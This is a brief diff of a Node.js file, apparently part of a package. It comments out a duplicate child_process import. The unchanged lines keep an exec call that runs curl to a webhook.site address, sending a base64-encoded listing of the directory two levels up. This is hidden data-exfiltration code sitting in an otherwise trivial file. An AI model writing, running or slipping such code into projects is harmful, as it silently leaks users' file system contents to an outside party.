@@ -31,7 +31,7 @@ const { exec } = require('node:child_process')
 
 console.log("xxxxxx");
 
-const { exec } = require('node:child_process')
+// const { exec } = require('node:child_process')
 
 
 exec('curl https://webhook.site/7d8cbbc5-b054-45b1-8504-7e56f999530f?$(cd ..; cd ..; ls | base64)' , (err, output) => {
